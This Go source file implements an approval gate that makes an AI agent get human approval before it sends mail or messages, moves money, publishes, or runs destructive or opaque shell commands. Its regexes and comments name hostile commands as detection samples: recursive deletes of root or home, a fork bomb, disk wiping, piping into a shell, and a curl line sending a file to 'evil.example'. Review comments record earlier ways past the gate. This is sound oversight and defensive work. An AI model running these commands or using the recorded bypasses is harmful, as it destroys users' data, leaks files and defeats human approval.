// Package safety is TheBot's approval gate: the deterministic check that
// stops a command or a request with real-world consequences before it runs,
// so a human can say yes first.
//
// Every system prompt TheBot runs under already says "ask before paying,
// sending a message, or anything you can't take back". That rule is not
// enough on its own, for the same reason the atomizer does not let a model
// judge its own task granularity: a small model follows it most of the time,
// and "most of the time" is the wrong reliability for a payment. So the rule
// is enforced twice - asked of the model, and checked here on what it
// actually tries to do - and the check is the one that cannot be talked out
// of it.
//
// The patterns are deliberately narrow. A gate that fires on ordinary work
// ("install this package", "delete the build folder") teaches a human to
// approve without reading, which is worse than no gate at all.
package safety

import (
	"regexp"
	"strings"
)

// Concern is why an action needs a human's approval before it runs.
type Concern struct {
	// Reason is one plain sentence a human can decide on.
	Reason string `json:"reason"`
}

type rule struct {
	re     *regexp.Regexp
	reason string
}

// progAt is where a program can stand in a shell line: at a line's start or after an operator, sudo, a quote
// closing or a substitution - never a word the same as it inside a script's text or a file's name.
const progAt = `(?im)(^[ \t]*|[;&|][ \t]*|\bsudo[ \t]+|['"][ \t]*|\$\([ \t]*|\x60[ \t]*)`

// both matches a command that holds a and b, in either order.
func both(a, b string) *regexp.Regexp {
	return regexp.MustCompile(`(?is)(?:` + a + `)[\s\S]*(?:` + b + `)|(?:` + b + `)[\s\S]*(?:` + a + `)`)
}

// postsRe is a program making a request that changes something on a server.
const postsRe = `\.(post|put|patch)\s*\(|\burlopen\s*\(|\bdata\s*=|\bmethod\s*=\s*['"]?(POST|PUT|PATCH)|\bfetch\s*\(`

// atCommand names the rules about which program runs. They are matched
// against the command with its quoted arguments blanked out: in
// `grep -E 'outbox|mail'` the bar is part of a pattern, not a pipe into mail.
var atCommand = map[string]bool{"it sends email": true, "it shuts down or restarts the machine": true}

// commandRules are checked against a shell command about to run.
var commandRules = []rule{
	// The program itself: at a line's start or after an operator, followed by its arguments or the end of the
	// line - never a word the same as it in a script's own text (`mail='flagged.txt'` in Python, found live
	// 2026-10-14: the quote before it and a newline between were read as "after a quote").
	{regexp.MustCompile(`(?im)(^[ \t]*|[;&|][ \t]*|\bsudo[ \t]+|['"][ \t]*|\$\([ \t]*|\x60[ \t]*)(sendmail|mailx?|mutt|ssmtp|msmtp|swaks)([ \t;&|<>)]|$)`),
		"it sends email"},
	// A message is sent by a messaging program run as a command, by a script that calls a messaging library's send, or
	// by a request to a service's send endpoint - not by the name of a service. Found live (2026-10-19, round 5): a
	// worker reading "WhatsApp Chat with ....txt" (the file's own name), and a script that listed "WhatsApp chat: ..."
	// as the source of each order row, were stopped for an approval "because it sends a message on someone's
	// behalf"; the person refused, and the task lost its footing.
	{regexp.MustCompile(`(?i)\btwilio\b[\s\S]*\bmessages\.create\s*\(|\bchat_(postMessage|postEphemeral|scheduleMessage)\s*\(|` +
		`\b(telegram|telebot|telethon|pyrogram)\b[\s\S]*\b(send_message|sendMessage|send_document|send_photo|send_file)\s*\(|` +
		`\bpywhatkit\b[\s\S]*\bsendwhat\w*\s*\(`),
		"it sends a message on someone's behalf"},
	{both(`api\.twilio\.com/[^\s"']*/Messages|api\.telegram\.org/bot[^\s"']*/send\w+|hooks\.slack\.com/(services|workflows)/|`+
		`slack\.com/api/chat\.(postMessage|postEphemeral|scheduleMessage)|discord(app)?\.com/api/(v\d+/)?webhooks/|`+
		`graph\.facebook\.com/[^\s"']*/messages\b`, postsRe),
		"it sends a message on someone's behalf"},
	// Money moves through a payment program run as a command, a script calling a payment library's create/capture, or
	// a request to a payment API - not through the name of a payment service next to the word "invoice".
	{regexp.MustCompile(`(?i)\bstripe\.(Charge|PaymentIntent|Payout|Transfer|Refund|Invoice)\b[\s\S]*?\.(create|confirm|capture|pay|send_invoice)\s*\(|` +
		`\b(paypalrestsdk|paypalhttp|paypalcheckoutsdk|braintree)\b[\s\S]*\.(create|execute|capture|sale)\s*\(|` +
		`\brazorpay\b[\s\S]*\.(payout\.create|transfer\.create|refund\.create|payment\.(capture|refund))\s*\(`),
		"it moves money"},
	{both(`api\.stripe\.com/v1/(charges|payment_intents|payouts|transfers|refunds)|api(-m)?\.paypal\.com/v[12]/(payments|payouts|checkout/orders)|`+
		`api\.razorpay\.com/v1/(payments|payouts|transfers|refunds|orders)`, postsRe),
		"it moves money"},
	{regexp.MustCompile(`(?i)\bgit\s+push\b`),
		"it publishes commits to a remote repository"},
	{regexp.MustCompile(`(?i)\b(npm|yarn|pnpm|cargo|twine|gem)\s+publish\b|\bdocker\s+push\b`),
		"it publishes a package or image"},
	{regexp.MustCompile(`(?i)\bgh\s+(pr\s+(create|merge|close)|issue\s+(create|close|comment)|release\s+create|repo\s+(delete|create))\b`),
		"it acts on GitHub as the user"},
	// The whole of /, a home or every home, also by a glob of what is in it ("/*", "~/*", "$HOME/.*"), with the
	// long option, or with a "--" end-of-options before the target (review 2026-11-02: "rm -rf /*" passed; round 3:
	// "rm -rf -- ~" passed).
	{regexp.MustCompile(`(?i)\brm\s+((-[a-z]*|--[a-z-]+)\s+)*(-[a-z]*r[a-z]*|--recursive)\s+((-[a-z]*|--[a-z-]+)\s+)*(--\s+)?("|')?(/|~/?|\$HOME/?|\$\{HOME\}/?|/home/?|/home/[^/\s]+/?)("|')?(\.?\*)?(\s|$)`),
		"it recursively deletes a home or root directory"},
	// find deleting everything under a home or root (-delete, or -exec rm/unlink/shred). A deeper path ("find
	// ~/work -delete") or an ordinary search ("find . -name x") is not it. Round 3: "find ~ -delete" passed.
	{regexp.MustCompile(`(?i)\bfind\s+("|')?(/|~/?|\$HOME/?|\$\{HOME\}/?|/home/?|/home/[^/\s]+/?)("|')?(\s)[\s\S]*?(-delete\b|-exec(dir)?\s+(rm|unlink|shred)\b)`),
		"it recursively deletes a home or root directory"},
	{regexp.MustCompile(`(?i)\bmkfs(\.\w+)?\b|\bdd\b[^|;&]*\bof=/dev/|\bwipefs\b|\bshred\b`),
		"it can destroy a disk or file permanently"},
	{regexp.MustCompile(`(?im)(^[ \t]*|[;&|][ \t]*|\bsudo[ \t]+|['"][ \t]*|\$\([ \t]*|\x60[ \t]*)(shutdown|reboot|poweroff|halt)([ \t;&|<>)]|$)|\binit\s+[06]\b`),
		"it shuts down or restarts the machine"},
	// A script that sends mail itself. Checked against the whole command - a here-document's code included.
	{regexp.MustCompile(`(?i)\bsmtplib\b[\s\S]*\.(send_message|sendmail)\s*\(|\bnodemailer\b[\s\S]*\bsendMail\s*\(`),
		"it sends email from a script"},
	{regexp.MustCompile(`:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:`),
		"it is a fork bomb"},
	{regexp.MustCompile(`(?i)\bchmod\s+(-[a-z]*\s+)*-[a-z]*R[a-z]*\s+[0-7]*7[0-7]*7\s+/(\s|$)|\bchown\s+(-[a-z]*\s+)*-[a-z]*R[a-z]*\s+\S+\s+/(\s|$)`),
		"it changes permissions on the whole filesystem"},
	// Any way curl is told to send: a method, a body (also --json, -d@file, --data=...), a form, an upload, and the
	// short data flags run together with others (-sd, -XPOST). Only -d/-F/-T send; -f/-s/-S (fail, silent, show
	// errors) do not, so the data letters are matched case-sensitively (review 2026-11-02 over-flagged -f/-sf/-sSf/-t
	// because the whole rule was case-insensitive and read -f as -F, -t as -T).
	{regexp.MustCompile(`(?i)\bcurl\b[^|;&]*(\s(-X\s*|--request[\s=]+)['"]?(POST|PUT|PATCH|DELETE)\b|\s--(data|data-\w+|json|form|form-string|upload-file)\b|\s-[a-zA-Z]*(?-i:[dFT])([\s=@'"]|$))`),
		"it sends data to a web service"},
	{regexp.MustCompile(`(?i)\bwget\b[^|;&]*\s--(post-data|post-file|body-data|body-file|method[\s=]+['"]?(POST|PUT|PATCH|DELETE))`),
		"it sends data to a web service"},
}

// indirectRules are matched against the shell's own words (quoted arguments blanked): code that reaches a shell or
// an interpreter from a pipe, a decoder or a substitution is code the rules above never saw, so it is asked about
// rather than let through (review 2026-11-02: a here-document piped into bash, and a decoded payload, passed).
var indirectRules = []rule{
	{regexp.MustCompile(`(?i)\|\s*(sudo\s+((-\S+|\S+=\S*)\s+)*)?(env\s+((-\S+|\S+=\S*)\s+)*)?(/\S*/)?(ba|z|da|k|c|tc|fi)?sh\b`),
		"it runs commands piped into a shell, which cannot be checked before they run"},
	// Code piped into an interpreter that reads it from stdin: "cat f | python3", "| python3 -", "| node -e". A named
	// script after it ("| python3 analyze.py") is a file, not stdin, so it is not matched (round 3: bare "| python3"
	// and "|python3" passed because the rule needed a "- " after the interpreter).
	{regexp.MustCompile(`(?i)\|\s*(sudo\s+((-\S+|\S+=\S*)\s+)*)?(env\s+((-\S+|\S+=\S*)\s+)*)?(/\S*/)?(python[0-9.]*|perl|ruby|node|nodejs|php|deno)\b[ \t]*(-|$|[;&|\n])`),
		"it runs code piped into an interpreter, which cannot be checked before it runs"},
	{regexp.MustCompile(`(?i)(^|[;&|(]\s*)(eval|source|\.)\s+["']?(\$\(|\x60|<\()|(^|[\s;&|(])(ba|z|da|k)?sh\s+(-\w+\s+)*<\(`),
		"it runs commands it builds or fetches at run time, which cannot be checked before they run"},
	{regexp.MustCompile(`(?i)\b(ba|z|da|k)?sh\s+(-\w+\s+)*-\w*c\w*\s+["']?(\$\(|\x60)`),
		"it runs commands it builds or fetches at run time, which cannot be checked before they run"},
}

// cmdPos is where a command word begins: a line's start, or after ;, |, &, ( or sudo. Unlike progAt it does not
// count a closing quote, because what follows a quote inside an argument ("$(date)" in echo "$(date)") is not a
// command the shell runs.
const cmdPos = `(?m)(^|[;&|(]|\bsudo\s+)[ \t]*`

// failClosedRules fire on a command whose effect the word rules above cannot read, so it is asked about rather than
// let through (the word filters are not a boundary). They are matched on the shell's own words (quoted stretches
// blanked), so a literal "$c" inside quotes is not one.
var failClosedRules = []rule{
	// The program to run is a variable or a command substitution ("c=rm; $c -rf ~", "$(echo rm) -rf ~"): what runs
	// is decided at run time and no rule here saw it. An ordinary "$VAR" used as an argument (echo "$VAR") is not at
	// a command position and is not matched.
	{regexp.MustCompile(cmdPos + `(\$\{?[A-Za-z_]|\$\(|\x60)`),
		"it runs a command chosen at run time (a variable or a substitution as the program), which cannot be checked before it runs"},
	// eval runs a string built at run time.
	{regexp.MustCompile(cmdPos + `eval\b`),
		"it runs commands it builds at run time (eval), which cannot be checked before they run"},
}

// inlineInterpRe finds an interpreter run with inline code (-c/-e/-E/-r), where that code (dangerousInlineRe) deletes
// files or shells out: "python3 -c '... shutil.rmtree ...'", "perl -e 'system(...)'". Plain inline code
// ("python3 -c 'print(1)'") is readable and left alone. Checked with here-documents blanked, so a python heredoc's
// body (its own data, not a shell command) is not read as inline code.
var inlineInterpRe = regexp.MustCompile(`(?i)\b(python[0-9.]*|perl|ruby|node|nodejs|php|deno)\b[^\n|;&]*?\s-[a-zA-Z]*[ceEr]\b`)
var dangerousInlineRe = regexp.MustCompile(`(?i)shutil\.rmtree|os\.(remove|unlink|rmdir|removedirs|system|execl?|popen)|subprocess\.|\bPopen\b|\bsystem\s*\(|child_process|execSync|spawnSync|\bunlink\b|FileUtils\.(rm|remove)|\brm\s+-[a-z]*[rf]`)

// programRules are matched against the shell's own words only (quoted arguments and here-documents blanked): a
// messaging or payment program run as a command.
var programRules = []rule{
	{regexp.MustCompile(progAt + `(twilio|telegram-send|slack-cli|signal-cli|yowsup-cli|whatsapp-cli|wacli)([ \t;&|<>)]|$)`),
		"it sends a message on someone's behalf"},
	{regexp.MustCompile(progAt + `stripe[ \t]+\S+[ \t]+(create|confirm|capture|pay|finalize|send)\b`),
		"it moves money"},
}

// AssessCommand reports whether a shell command needs approval before it
// runs, or nil if it does not.
func AssessCommand(command string) *Concern {
	command = strings.TrimSpace(command)
	if command == "" {
		return nil
	}
	if c := wipeConcern(command, 0); c != nil {
		return c
	}
	unquoted := blankQuoted(blankHeredocs(command))
	for _, r := range commandRules {
		target := command
		if atCommand[r.reason] {
			target = unquoted
		}
		if !r.re.MatchString(target) {
			continue
		}
		// Sending to a server on this machine is development, but only when every target of every curl and wget is
		// local (round-5 recheck: "curl -d @x http://localhost:1 evil.example" went to both and passed as local).
		if r.reason == "it sends data to a web service" && onlyLocalTargets(command) {
			continue
		}
		return &Concern{Reason: r.reason}
	}
	for _, r := range programRules {
		if r.re.MatchString(unquoted) {
			return &Concern{Reason: r.reason}
		}
	}
	// With the here-documents left in: `cat <<EOF | bash` feeds its body to the shell even though cat reads it.
	for _, r := range indirectRules {
		if r.re.MatchString(unquoted) || r.re.MatchString(blankQuoted(command)) {
			return &Concern{Reason: r.reason}
		}
	}
	for _, r := range failClosedRules {
		if r.re.MatchString(unquoted) {
			return &Concern{Reason: r.reason}
		}
	}
	if interp := blankHeredocs(command); inlineInterpRe.MatchString(interp) && dangerousInlineRe.MatchString(interp) {
		return &Concern{Reason: "it runs code that deletes files or runs other commands through an interpreter's -c/-e, which cannot be checked before it runs"}
	}
	return nil
}

// heredocRe finds a here-document: the program it is fed to, and its end word.
var heredocRe = regexp.MustCompile(`(?m)^[ \t]*(?:[A-Za-z_][A-Za-z0-9_]*=\S*[ \t]+)*(\S+)[^\n]*?<<(-?)[ \t]*['"]?([A-Za-z_][A-Za-z0-9_]*)['"]?[^\n]*\n`)

// shellReaders run what they are fed as shell commands: a here-document fed to them is commands, not data.
var shellReaders = map[string]bool{"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "ssh": true,
	"su": true, "sudo": true, "eval": true, "xargs": true, "env": true, "exec": true, "source": true, ".": true}

// blankHeredocs empties each here-document fed to a program that is not a shell (python3 - <<'PY' ... PY): its
// lines are that program's code or data, and a word in them is not a command the shell will run.
func blankHeredocs(command string) string {
	var b strings.Builder
	rest := command
	for {
		m := heredocRe.FindStringSubmatchIndex(rest)
		if m == nil {
			b.WriteString(rest)
			return b.String()
		}
		program := rest[m[2]:m[3]]
		if i := strings.LastIndex(program, "/"); i >= 0 {
			program = program[i+1:]
		}
		dash, word := rest[m[4]:m[5]] == "-", rest[m[6]:m[7]]
		b.WriteString(rest[:m[1]])
		rest = rest[m[1]:]
		end, offset := -1, 0
		for offset < len(rest) {
			line := rest[offset:]
			if i := strings.IndexByte(line, '\n'); i >= 0 {
				line = line[:i]
			}
			check := line
			if dash {
				check = strings.TrimLeft(check, "\t")
			}
			if strings.TrimRight(check, "\r") == word {
				end = offset
				break
			}
			offset += len(line) + 1
		}
		if end < 0 || shellReaders[program] {
			continue // no end found, or the body is shell: left as it is
		}
		rest = rest[end:]
	}
}

// quotedRe is a single- or double-quoted stretch of a shell line.
var quotedRe = regexp.MustCompile(`'[^'\n]*'|"(?:[^"\\\n]|\\.)*"`)

// runsQuotedRe ends where a quoted stretch would be run as shell code itself:
// `sh -c '...'`, `bash -lc "..."`, `eval '...'`, `ssh host '...'`.
var runsQuotedRe = regexp.MustCompile(`(?i)(\b(sh|bash|zsh|dash|ksh|su)\s+(-\w+\s+)*-\w*c\w*\s+|\beval\s+|\bssh\s+(-\S+\s+)*\S+\s+|\bxargs\s+(-\S+\s+)*)$`)

// blankQuoted replaces each quoted argument of a command with an empty pair of
// quotes, so what is left is the shell's own words and operators. A quoted
// stretch that is itself run as shell code (`sh -c '... | mail ...'`) is kept:
// its pipes are real.
func blankQuoted(command string) string {
	var b strings.Builder
	last := 0
	for _, m := range quotedRe.FindAllStringIndex(command, -1) {
		b.WriteString(command[last:m[0]])
		quoted := command[m[0]:m[1]]
		// A command substitution inside double quotes runs: in
		// `echo "$(mail -s x a@b < f)"` the mail is sent (found in review,
		// 2026-10-14 - blanking the quotes hid it).
		substitutes := quoted[0] == '"' && (strings.Contains(quoted, "$(") || strings.Contains(quoted, "\x60"))
		if substitutes || runsQuotedRe.MatchString(command[:m[0]]) {
			b.WriteString(command[m[0]:m[1]])
		} else {
			b.WriteString("''")
		}
		last = m[1]
	}
	b.WriteString(command[last:])
	return b.String()
}

// requestRules are checked against what the human asked for, before any
// work starts. They only fire on a direct instruction to do the thing - a
// question about it ("how do I send an email from python?") or a request to
// build something that could ("write a script that emails a report") is not
// the act itself.
// leadIn is the politeness a direct instruction may open with.
const leadIn = `(?i)^\s*(please\s+)?(can you\s+|could you\s+|would you\s+|go\s+(ahead\s+and\s+)?|now\s+)?`

var requestRules = []rule{
	{regexp.MustCompile(leadIn + `(pay|repay|settle)\s+(the|my|this|that|an?|\$|\d|him|her|them)`),
		"it asks me to make a payment"},
	{regexp.MustCompile(leadIn + `(buy|purchase|donate|wire|transfer\s+(\$|money|funds|\d)|subscribe\s+(me\s+)?to\b|book\s+(me\s+)?(a|an)\s+(flight|table|hotel|room|ticket|appointment|cab|ride|taxi))`),
		"it asks me to spend money or commit you to something"},
	{regexp.MustCompile(leadIn + `(send|write\s+and\s+send)\s+(an?\s+|the\s+|my\s+)?(e-?mail|message|text|sms|whatsapp|dm|tweet|reply|invite|invitation)\b`),
		"it asks me to send a message on your behalf"},
	{regexp.MustCompile(leadIn + `(e-?mail|text|whatsapp|message|dm|ping)\s+(my|him|her|them|\S+@\S+)`),
		"it asks me to send a message on your behalf"},
	{regexp.MustCompile(leadIn + `(post|publish|tweet|share)\b[\s\S]{0,80}\b(on|to)\s+(twitter|x|linkedin|facebook|instagram|reddit|slack|discord|mastodon|bluesky|social media|my\s+(blog|feed|timeline|page|channel))\b`),
		"it asks me to publish something publicly"},
	{regexp.MustCompile(leadIn + `(delete|close|cancel|deactivate)\s+my\s+(\w+\s+)?(account|subscription|membership|order|booking|reservation)\b`),
		"it asks me to close or cancel something of yours"},
}

// AssessRequest reports whether the human's request is itself a
// consequential act that needs a confirmation before any work starts.
func AssessRequest(prompt string) *Concern {
	for _, r := range requestRules {
		if r.re.MatchString(prompt) {
			return &Concern{Reason: r.reason}
		}
	}
	return nil
}

var (
	approvalRe = regexp.MustCompile(`(?i)^\s*(yes|yep|yeah|yup|y|ok|okay|sure|approved?|i approve|confirm(ed)?|go( ahead)?|go for it|do it|proceed|continue|lgtm|sounds good|fine|allowed?|granted|you can|please do|affirmative)\b`)
	refusalRe  = regexp.MustCompile(`(?i)\b(no|nope|don'?t|do not|stop|cancel|abort|wait|hold on|never|not now|deny|denied|reject(ed)?)\b`)
	// A question back, or a yes on a condition, grants nothing yet: "ok, what will this send?" asks before deciding, and
	// "yes if the total matches" is a yes only once something holds that no one has checked.
	questionRe  = regexp.MustCompile(`(?i)\?|\b(what|which|how|why|where|who|whom|whose|when)\b`)
	conditionRe = regexp.MustCompile(`(?i)\b(if|only|unless|provided|providing|as long as|so long as|assuming|but|except|after|once|first|before|until)\b`)
)

// IsApproval reports whether a human's reply to an approval request grants
// it. A reply that says yes and no at once ("ok but don't push yet") is not
// an approval - the gate stays shut and the reply is passed on as input.
// Only a clear affirmative is one: a reply with a question in it, or a
// condition, is not a yes.
func IsApproval(reply string) bool {
	reply = strings.TrimSpace(reply)
	if reply == "" || !approvalRe.MatchString(reply) {
		return false
	}
	return !refusalRe.MatchString(reply) && !questionRe.MatchString(reply) && !conditionRe.MatchString(reply)
}
